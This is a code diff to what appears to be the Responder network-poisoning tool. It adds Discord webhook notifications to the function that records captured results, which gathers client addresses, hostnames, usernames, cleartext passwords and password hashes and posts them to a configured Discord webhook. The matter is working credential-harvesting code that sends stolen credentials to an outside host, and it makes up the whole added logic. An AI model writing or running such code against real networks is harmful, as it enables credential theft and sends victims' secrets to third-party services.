@@ -25,13 +25,29 @@ import datetime
 import codecs
 import struct
 import random
+import json
 try:
 	import netifaces
 except:
 	sys.exit('You need to install python-netifaces or run Responder with python3...\nTry "apt-get install python-netifaces" or "pip install netifaces"')
 	
 from calendar import timegm
+try:
+	from discord_webhook import DiscordWebhook
+except:
+	print("Discord dependencies not found!! No discrod notifications will be sent")
 
+def setDiscordHook(hook):
+	with open("discord.json","r") as discordFile:
+		data=json.load(discordFile)
+	data["webhook"]= hook
+	with open("discord.json","w") as toWrite:
+		json.dump(data, toWrite)
+
+def getDiscordUrl():
+	with open("discord.json","r") as discordFile:
+		data=json.load(discordFile)
+	return data["webhook"]
 def if_nametoindex2(name):
 	if settings.Config.PY2OR3 == "PY2":
 		import ctypes
@@ -92,6 +108,9 @@ def color(txt, code = 1, modifier = 0):
 		return txt
 	return "\033[%d;3%dm%s\033[0m" % (modifier, code, txt)
 
+def strip(txt):
+	stripcolors = re.sub(r'\x1b\[([0-9,A-Z]{1,2}(;[0-9]{1,2})?(;[0-9]{3})?)?[m|K]?', '', txt)
+	return stripcolors
 def text(txt):
 	stripcolors = re.sub(r'\x1b\[([0-9,A-Z]{1,2}(;[0-9]{1,2})?(;[0-9]{3})?)?[m|K]?', '', txt)
 	logging.info(stripcolors)
@@ -348,24 +367,39 @@ def SaveToDb(result):
 				outf.write(result['fullhash'] + '\n')#.encode('utf8', 'replace') + '\n')
 
 	if not count or settings.Config.Verbose:  # Print output
+		toSubmit = ""
 		if len(result['client']):
+			toSubmit += strip("[%s] %s Client   : %s" % (result['module'], result['type'], color(result['client'], 3))) +"\n"
 			print(text("[%s] %s Client   : %s" % (result['module'], result['type'], color(result['client'], 3))))
 
 		if len(result['hostname']):
+			toSubmit += strip("[%s] %s Hostname : %s" % (result['module'], result['type'], color(result['hostname'], 3)))+"\n"
 			print(text("[%s] %s Hostname : %s" % (result['module'], result['type'], color(result['hostname'], 3))))
 
 		if len(result['user']):
+			toSubmit += strip("[%s] %s Username : %s" % (result['module'], result['type'], color(result['user'], 3))) +"\n"
 			print(text("[%s] %s Username : %s" % (result['module'], result['type'], color(result['user'], 3))))
 
 		# Bu order of priority, print cleartext, fullhash, or hash
 		if len(result['cleartext']):
+			toSubmit += strip("[%s] %s Password : %s" % (result['module'], result['type'], color(result['cleartext'], 3))) +"\n"
 			print(text("[%s] %s Password : %s" % (result['module'], result['type'], color(result['cleartext'], 3))))
 
 		elif len(result['fullhash']):
+			toSubmit += strip("[%s] %s Hash     : %s" % (result['module'], result['type'], color(result['fullhash'], 3))) +"\n"
 			print(text("[%s] %s Hash     : %s" % (result['module'], result['type'], color(result['fullhash'], 3))))
 
 		elif len(result['hash']):
+			toSubmit += strip("[%s] %s Hash     : %s" % (result['module'], result['type'], color(result['hash'], 3))) +"\n" 
 			print(text("[%s] %s Hash     : %s" % (result['module'], result['type'], color(result['hash'], 3))))
+		discordHook = getDiscordUrl()
+		if toSubmit != "" and discordHook != "":
+			try: 
+				webhook = DiscordWebhook(url=discordHook, rate_limit_retry=True,
+							content=toSubmit)
+				webhook.execute()
+			except:
+				print("Could not notify discord!")
 
 		# Appending auto-ignore list if required
 		# Except if this is a machine account's hash
